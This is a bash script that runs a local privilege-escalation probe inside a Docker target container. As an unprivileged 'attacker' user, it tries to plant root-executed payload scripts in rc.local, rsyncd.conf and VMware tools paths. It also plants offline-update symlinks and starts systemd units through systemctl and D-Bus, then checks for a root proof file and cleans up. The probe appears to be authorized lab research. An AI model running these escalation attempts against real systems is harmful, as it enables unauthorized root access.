#!/usr/bin/env bash
set -Eeuo pipefail

container="${1:-ubuntu24-server-lpe-target}"
repo_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
log_path="$repo_dir/logs/condition-gated-services-20260517.out"

mkdir -p "$repo_dir/logs"
tmp_log="$(mktemp "$repo_dir/logs/condition-gated-services-20260517.out.tmp.XXXXXX")"

cleanup_host() {
  rm -f "$tmp_log"
}
trap cleanup_host EXIT

{
  echo "condition-gated/default services probe"
  echo "target=$container"
  date -u +"utc=%Y-%m-%dT%H:%M:%SZ"
  docker inspect "$container" --format 'container={{.Name}} image={{.Config.Image}} status={{.State.Status}} started={{.State.StartedAt}}'
  echo
} >"$tmp_log"

docker exec -i "$container" bash <<'TARGET' >>"$tmp_log" 2>&1
set +e
export LC_ALL=C

probe="condition_gated_services_20260517"
work="/tmp/${probe}"
created_list="${work}/created-paths"
root_marker="/root/${probe}_root_proof"

section() {
  printf '\n## %s\n' "$1"
}

run_as_attacker() {
  label="$1"
  cmd="$2"
  printf '\n### attacker: %s\n' "$label"
  timeout 25s runuser -u attacker -- bash -lc "$cmd" 2>&1
  printf 'rc=%s\n' "$?"
}

pkg_line() {
  pkg="$1"
  dpkg-query -W -f='${binary:Package}\t${Version}\t${Architecture}\t${db:Status-Abbrev}\n' "$pkg" 2>/dev/null ||
    printf '%s\t(not installed)\t-\tun\n' "$pkg"
}

stat_path() {
  p="$1"
  if [ -e "$p" ] || [ -L "$p" ]; then
    stat -Lc '%A %a %U:%G %F %n' "$p" 2>&1
    getcap "$p" 2>/dev/null || true
  else
    parent="${p%/*}"
    [ -n "$parent" ] || parent="/"
    printf 'MISSING %s parent=' "$p"
    stat -Lc '%A %a %U:%G %F %n' "$parent" 2>&1 || true
  fi
}

show_unit() {
  u="$1"
  printf '\n### %s\n' "$u"
  systemctl show "$u" \
    -p Id -p LoadState -p UnitFileState -p ActiveState -p SubState \
    -p Result -p ConditionResult -p AssertResult -p FragmentPath \
    -p User -p Group -p ExecStart -p ExecStartPre -p ExecCondition \
    -p Triggers -p TriggeredBy 2>&1 || true
}

show_file() {
  p="$1"
  printf '\n### %s\n' "$p"
  if [ -e "$p" ] || [ -L "$p" ]; then
    stat_path "$p"
    if [ -f "$p" ]; then
      nl -ba "$p" | sed -n '1,180p'
    fi
  else
    echo "MISSING"
  fi
}

rm -rf "$work"
mkdir -p "$work"
chmod 1777 "$work"
: > "$created_list"
chmod 666 "$created_list"
rm -f "$root_marker"

section "target, users, and default package proof"
sed -n '1,12p' /etc/os-release
uname -a
ps -p 1 -o user=,comm=,args=
printf 'systemd-detect-virt -v: '; systemd-detect-virt -v 2>&1 || true
printf 'systemd-detect-virt -c: '; systemd-detect-virt -c 2>&1 || true
printf 'systemd-detect-virt --vm: '; systemd-detect-virt --vm 2>&1 || true
systemctl --version | head -1
printf 'systemctl is-system-running: '; systemctl is-system-running 2>&1 || true
id attacker
groups attacker
getent group sudo adm lxd docker rsync vmware syslog systemd-journal 2>/dev/null || true
printf '\n[manual package seeds]\n'
apt-mark showmanual 2>/dev/null | sort | sed -n '1,120p'

section "package versions"
for pkg in \
  ubuntu-minimal ubuntu-standard ubuntu-server \
  systemd systemd-sysv dbus policykit-1 polkitd \
  open-vm-tools open-vm-tools-desktop open-vm-tools-containerinfo open-vm-tools-sdmp \
  rsync initscripts; do
  pkg_line "$pkg"
done | sort

section "default unit state before attacker triggers"
systemctl list-unit-files --no-pager --no-legend \
  vgauth.service open-vm-tools.service vmtoolsd.service rsync.service \
  rc-local.service system-update-cleanup.service system-update.target 2>&1 || true
for u in \
  vgauth.service open-vm-tools.service vmtoolsd.service rsync.service \
  rc-local.service system-update-cleanup.service system-update.target; do
  show_unit "$u"
done

section "unit files and condition gates"
for f in \
  /usr/lib/systemd/system/vgauth.service \
  /usr/lib/systemd/system/open-vm-tools.service \
  /usr/lib/systemd/system/rsync.service \
  /usr/lib/systemd/system/rc-local.service \
  /usr/lib/systemd/system/system-update-cleanup.service \
  /usr/lib/systemd/system/system-update.target; do
  show_file "$f"
done
printf '\n[condition evaluation]\n'
for c in \
  'ConditionVirtualization=vmware' \
  'ConditionPathExists=/etc/rsyncd.conf' \
  'ConditionFileIsExecutable=/etc/rc.local' \
  'ConditionPathExists=|/system-update' \
  'ConditionPathIsSymbolicLink=|/system-update' \
  'ConditionPathExists=|/etc/system-update' \
  'ConditionPathIsSymbolicLink=|/etc/system-update'; do
  echo "### $c"
  systemd-analyze condition "$c" 2>&1 || true
done

section "default files, helpers, sockets, and writable boundaries"
for p in \
  / /etc /run /var/run /var/lib /var/log /tmp \
  /usr/bin/VGAuthService /usr/bin/vmtoolsd /usr/bin/vmware-toolbox-cmd \
  /usr/bin/vmware-checkvm /usr/bin/rsync /etc/rsyncd.conf \
  /etc/rc.local /system-update /etc/system-update /system-update-preparing \
  /etc/vmware-tools /etc/vmware-tools/tools.conf /etc/vmware-tools/vgauth.conf \
  /etc/vmware-tools/scripts /etc/vmware-tools/scripts/vmware \
  /etc/vmware-tools/scripts/vmware/network /run/vmware /var/run/vmware \
  /var/lib/vmware /var/log/vmware /dev/vsock /proc/net/vsock; do
  stat_path "$p"
done
printf '\n[matching sockets]\n'
ss -ltnupx 2>&1 | grep -Ei 'rsync|873|vmware|vmtools|vgauth|system-update|rc-local' || true
printf '\n[matching processes]\n'
ps -eo user:18,uid,pid,ppid,comm,args |
  awk 'NR == 1 || /[r]sync|[v]mtools|[V]GAuth|[s]ystem-update|[r]c.local/ {print}'
printf '\n[world-writable matching paths]\n'
find /etc /run /var /usr/lib/systemd /usr/bin -xdev -maxdepth 4 ! -type l -perm -0002 \
  -printf '%M %u:%g %p -> %l\n' 2>/dev/null |
  grep -Ei 'rsync|rc.local|system-update|vmware|vmtools|vgauth' || true

section "uid1001 default reachability and write attempts"
run_as_attacker "identity and privilege baseline" '
id
groups
grep CapEff /proc/self/status
sudo -n true 2>&1; echo "sudo_rc=$?"
'

run_as_attacker "writability of root-gated service inputs" '
for p in \
  /etc/rsyncd.conf \
  /etc/rc.local \
  /system-update \
  /etc/system-update \
  /etc/vmware-tools/tools.conf \
  /etc/vmware-tools/vgauth.conf \
  /etc/vmware-tools/scripts/vmware/network \
  /etc/vmware-tools/scripts/vmware \
  /etc/vmware-tools \
  /run/vmware \
  /var/run/vmware \
  /var/lib/vmware \
  /var/log/vmware; do
  printf "test -w %s -> " "$p"
  test -w "$p" && echo WRITABLE || echo no
done
'

run_as_attacker "attempt to plant root-executed candidates only as uid1001" '
set +e
marker=/root/condition_gated_services_20260517_root_proof
payload="#!/bin/sh\nid > ${marker}\nuname -a >> ${marker}\n"
for p in \
  /etc/rsyncd.conf \
  /etc/rc.local \
  /etc/vmware-tools/scripts/vmware/condition_gated_services_probe \
  /etc/vmware-tools/condition_gated_services_probe.conf \
  /run/vmware/condition_gated_services_probe \
  /var/run/vmware/condition_gated_services_probe \
  /var/lib/vmware/condition_gated_services_probe \
  /var/log/vmware/condition_gated_services_probe; do
  printf "write %s -> " "$p"
  mkdir -p "$(dirname "$p")" 2>/dev/null
  if printf "%b" "$payload" > "$p" 2>/tmp/condition_gated_services_20260517_write.err; then
    chmod 755 "$p" 2>/dev/null || true
    echo WRITE_OK
    echo "$p" >> /tmp/condition_gated_services_20260517/created-paths 2>/dev/null || true
  else
    cat /tmp/condition_gated_services_20260517_write.err 2>/dev/null || true
  fi
done
rm -f /tmp/condition_gated_services_20260517_write.err
for p in /system-update /etc/system-update; do
  printf "symlink %s -> " "$p"
  if ln -s /tmp/condition_gated_services_20260517_offline_update "$p" 2>/tmp/condition_gated_services_20260517_link.err; then
    echo LINK_OK
    echo "$p" >> /tmp/condition_gated_services_20260517/created-paths 2>/dev/null || true
  else
    cat /tmp/condition_gated_services_20260517_link.err 2>/dev/null || true
  fi
done
rm -f /tmp/condition_gated_services_20260517_link.err
'

section "uid1001 service manager trigger attempts"
run_as_attacker "systemctl start units" '
for u in \
  vgauth.service \
  open-vm-tools.service \
  vmtoolsd.service \
  rsync.service \
  rc-local.service \
  system-update-cleanup.service \
  system-update.target; do
  echo "### systemctl start $u"
  systemctl start "$u" 2>&1
  echo "rc=$?"
done
'
run_as_attacker "systemd dbus StartUnit" '
for u in \
  vgauth.service \
  open-vm-tools.service \
  rsync.service \
  rc-local.service \
  system-update-cleanup.service \
  system-update.target; do
  echo "### busctl StartUnit $u"
  busctl call --system org.freedesktop.systemd1 /org/freedesktop/systemd1 \
    org.freedesktop.systemd1.Manager StartUnit ss "$u" replace 2>&1
  echo "rc=$?"
done
'

section "uid1001 direct helper and daemon trigger attempts"
run_as_attacker "open-vm-tools and vgauth direct helper boundary" '
id
timeout 5s vmware-checkvm 2>&1
echo "vmware_checkvm_rc=$?"
timeout 5s vmtoolsd --cmd "info-get guestinfo.condition_gated_services_20260517" 2>&1
echo "vmtoolsd_cmd_rc=$?"
timeout 5s vmware-toolbox-cmd stat raw text sessionid 2>&1
echo "toolbox_rc=$?"
timeout 5s /usr/bin/VGAuthService 2>&1 | sed -n "1,80p"
echo "vgauth_direct_rc=${PIPESTATUS[0]}"
'
run_as_attacker "rsync direct daemon/client boundary" '
set +e
id
timeout 5s rsync --daemon --no-detach 2>&1 | sed -n "1,80p"
echo "rsync_daemon_default_rc=${PIPESTATUS[0]}"
tmp=/tmp/condition_gated_services_20260517_rsyncd.conf
cat > "$tmp" <<EOF
pid file = /tmp/condition_gated_services_20260517_rsync.pid
port = 1873
[attacker]
    path = /tmp
    read only = yes
EOF
timeout 3s rsync --daemon --no-detach --config="$tmp" --port=1873 &
pid=$!
sleep 1
ps -o user=,uid=,pid=,comm=,args= -p "$pid" 2>&1 || true
timeout 3s rsync rsync://127.0.0.1:1873/ 2>&1 | sed -n "1,40p"
kill "$pid" 2>/dev/null || true
wait "$pid" 2>/dev/null || true
rm -f "$tmp" /tmp/condition_gated_services_20260517_rsync.pid
'
run_as_attacker "rc-local and offline-update path boundary" '
set +e
id
/etc/rc.local start 2>&1
echo "rc_local_exec_rc=$?"
rm -fv /system-update /etc/system-update 2>&1
echo "attacker_rm_offline_update_rc=$?"
systemctl list-dependencies system-update.target --no-pager 2>&1 | sed -n "1,80p"
echo "list_deps_rc=${PIPESTATUS[0]}"
'

section "post-trigger state and root proof"
for u in \
  vgauth.service open-vm-tools.service vmtoolsd.service rsync.service \
  rc-local.service system-update-cleanup.service system-update.target; do
  show_unit "$u"
done
printf '\n[matching sockets after triggers]\n'
ss -ltnupx 2>&1 | grep -Ei 'rsync|873|1873|vmware|vmtools|vgauth|system-update|rc-local' || true
printf '\n[matching processes after triggers]\n'
ps -eo user:18,uid,pid,ppid,comm,args |
  awk 'NR == 1 || /[r]sync|[v]mtools|[V]GAuth|[s]ystem-update|[r]c.local/ {print}'
if [ -e "$root_marker" ]; then
  echo "ROOT_PROOF_PRESENT"
  stat_path "$root_marker"
  sed -n '1,40p' "$root_marker"
else
  echo "ROOT_PROOF_ABSENT $root_marker"
fi
find /root /tmp /home/attacker -maxdepth 3 \
  \( -name '*condition_gated_services_20260517*' -o -name '*rsyncd.conf' \) \
  -printf '%M %u:%g %p -> %l\n' 2>/dev/null || true

section "cleanup"
if [ -s "$created_list" ]; then
  while IFS= read -r p; do
    case "$p" in
      /etc/rsyncd.conf|/etc/rc.local|/system-update|/etc/system-update|/etc/vmware-tools/*|/run/vmware/*|/var/run/vmware/*|/var/lib/vmware/*|/var/log/vmware/*)
        rm -f "$p" 2>/dev/null || true
        echo "removed $p"
        ;;
    esac
  done < "$created_list"
fi
rm -rf "$work" \
  /tmp/condition_gated_services_20260517* \
  /home/attacker/condition_gated_services_20260517* 2>/dev/null || true
rm -f "$root_marker" 2>/dev/null || true
printf 'systemctl is-system-running: '; systemctl is-system-running 2>&1 || true
systemctl --failed --no-legend 2>&1 || true
echo "cleanup complete"
TARGET

mv "$tmp_log" "$log_path"
trap - EXIT
echo "wrote $log_path"
sed -n '1,260p' "$log_path"
